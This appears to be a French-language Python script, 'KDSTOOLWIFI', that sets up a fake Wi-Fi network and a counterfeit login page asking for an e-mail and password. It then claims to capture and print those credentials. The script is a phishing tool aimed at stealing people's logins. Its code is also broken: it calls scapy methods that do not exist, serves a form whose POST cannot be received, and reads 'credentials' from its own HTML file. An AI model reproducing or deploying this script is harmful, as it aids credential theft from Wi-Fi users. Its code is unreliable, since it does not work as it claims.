import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
from colorama import init, Fore, Back, Style
import requests
import itertools
import http.server
import socketserver
import threading
import os
import webbrowser
import subprocess

init(autoreset=True)

# Titre en ASCII
print(Fore.GREEN + """
  _______
 /       \
|  KDSTOOLWIFI  |
 _______/
""")

# Demande le nom du réseau Wi-Fi
wifi_name = input(Fore.CYAN + "Entrez le nom de votre réseau Wi-Fi : ")

# Demande si l'utilisateur veut mettre un mot de passe
password_required = input(Fore.CYAN + "Voulez-vous mettre un mot de passe pour votre réseau Wi-Fi ? (o/n) : ")

if password_required.lower() == 'o':
    # Demande le mot de passe
    password = input(Fore.CYAN + "Entrez le mot de passe pour votre réseau Wi-Fi : ")
else:
    password = None

# Crée un objet WiFi
wifi = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")

# Crée un réseau Wi-Fi
packet = Dot11Beacon()
packet[Dot11Elt].info = wifi_name
packet[Dot11Elt].len = len(wifi_name)

# Configure le réseau Wi-Fi
wifi.set_interface('wlan0')
wifi.set_ip_address('192.168.1.1/24')
wifi.set_broadcast('192.168.1.255')
wifi.set_multicast(True)

print(Fore.GREEN + "Réseau Wi-Fi configuré avec succès !")

# Crée une page HTML
html = """
<html>
  <head>
    <title>Connexion au réseau Wi-Fi</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f0f0f0;
      }
      .container {
        width: 300px;
        margin: 50px auto;
        padding: 20px;
        background-color: #fff;
        border: 1px solid #ddd;
        border-radius: 10px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      }
      .header {
        text-align: center;
        margin-bottom: 20px;
      }
      .header h1 {
        font-size: 24px;
        font-weight: bold;
        color: #333;
      }
      .form {
        margin-top: 20px;
      }
      .form input[type="email"], .form input[type="password"] {
        width: 100%;
        height: 40px;
        margin-bottom: 20px;
        padding: 10px;
        border: 1px solid #ccc;
        border-radius: 5px;
      }
      .form input[type="submit"] {
        width: 100%;
        height: 40px;
        background-color: #4CAF50;
        color: #fff;
        padding: 10px;
        border: none;
        border-radius: 5px;
        cursor: pointer;
      }
      .form input[type="submit"]:hover {
        background-color: #3e8e41;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="header">
        <h1>Connexion au réseau Wi-Fi</h1>
      </div>
      <form class="form" action="" method=" post">
        <input type="email" name="email" placeholder="Adresse e-mail">
        <input type="password" name="password" placeholder="Mot de passe">
        <input type="submit" value="Se connecter">
      </form>
    </div>
  </body>
</html>
"""

# Enregistrez la page HTML dans un fichier
with open("index.html", "w") as f:
    f.write(html)

# Créez un serveur HTTP simple pour servir la page HTML
def serve_http():
    with socketserver.TCPServer(("", 8080), http.server.SimpleHTTPRequestHandler) as httpd:
        print("Serving HTTP on port 8080...")
        httpd.serve_forever()

# Démarrez le serveur HTTP dans un thread séparé
threading.Thread(target=serve_http).start()

# Redirige l'utilisateur vers la page HTML
webbrowser.open("http://localhost:8080/index.html")

# Fonction pour récupérer les informations de connexion
def get_wifi_credentials():
    # Récupère les informations de connexion à partir de la page HTML
    with open("index.html", "r") as f:
        html_content = f.read()
    email = html_content.split("email")[ 1].split('"')[1]
    password = html_content.split("password")[1].split('"')[1]
    return email, password

# Récupère les informations de connexion
email, password = get_wifi_credentials()

print(Fore.GREEN + "Informations de connexion récupérées avec succès !")
print(Fore.CYAN + f"Adresse e-mail : {email}")
print(Fore.CYAN + f"Mot de passe : {password}")

# Ferme le serveur HTTP
os.system("pkill -f http.server")
